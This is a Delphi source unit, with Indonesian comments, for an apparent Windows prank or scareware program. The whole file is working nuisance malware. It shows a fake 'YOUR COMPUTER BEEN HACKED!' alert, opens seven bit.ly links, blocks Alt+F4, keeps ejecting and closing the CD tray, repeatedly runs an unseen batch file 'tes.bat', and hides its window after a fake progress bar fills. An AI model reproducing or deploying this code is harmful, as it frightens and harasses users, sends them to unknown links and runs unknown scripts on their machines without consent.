unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ShellAPI, StdCtrls, Mmsystem, registry, jpeg, ExtCtrls, XPMan, ComCtrls;

type
  TForm1 = class(TForm)
    ProgressBar1: TProgressBar;
    Timer1: TTimer;
    Timer2: TTimer;
    Timer3: TTimer;
    Timer4: TTimer;
    XPManifest1: TXPManifest;
    Image1: TImage;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);

  // Pendeklarasian PRIVATE
  private

  // Pendeklarasian PUBLIC
  public
  procedure AppMessage(var Msg: TMSG; var HAndled: Boolean);  // Pendeklarasian AppMassage NOT ALT+F4
  end;

var
  waktu,pb:integer;
  Form1: TForm1;


implementation

{$R *.dfm}
// Disable ALT+F4
 procedure TForm1.AppMessage(var Msg: TMSG; var Handled: Boolean);
begin
  Handled := False;
  case Msg.Message of
        WM_SYSKEYDOWN:
          if Msg.wParam = VK_F4 then
          begin
          Handled := True; // ON : True | OFF : False
          ShowMessage('DILARANG MENEKAN TOMBOL ALT+F4!');
  end;
end;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
 Application.MessageBox('YOUR COMPUTER BEEN HACKED!',
    'WARNING', MB_OK or MB_ICONEXCLAMATION);

ShellExecute (0, 'Open', 'http://bit.ly/newswinapp-1', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/newswinapp-2', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/newswinapp-3', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/newswinapp-4', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/fotowinapp-1', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/kpuwinapp-1', '', '', SW_SHOWNORMAL);
ShellExecute (0, 'Open', 'http://bit.ly/vidwinapp-1', '', '', SW_SHOWNORMAL);

  Application.OnMessage := AppMessage;
end;

// OPEN CMD
procedure TForm1.Timer4Timer(Sender: TObject);
begin
ShellExecute(TForm(Owner).Handle,nil,PChar('tes.bat'), nil, nil,SW_SHOWNORMAL);
end;
// nil adalah sama dengan try, berulang

// CD OPEN CLOSE
procedure TForm1.Timer1Timer(Sender: TObject);
begin
try
mciSendString('Set cdaudio door open', nil, 0, handle);
except
end;
timer2.Enabled:= true;
timer1.Enabled:= false;
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
try
mciSendString('Set cdaudio door closed', nil, 0, handle);
except
end;
timer1.Enabled:= true;
timer2.Enabled:= false;
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
pb:=pb+1;
ProgressBar1.Position:=pb;
waktu:=waktu-1;
if pb=100 then
begin
Timer3.Enabled := False;
Form1.Visible:= False;

end;
end;

end.
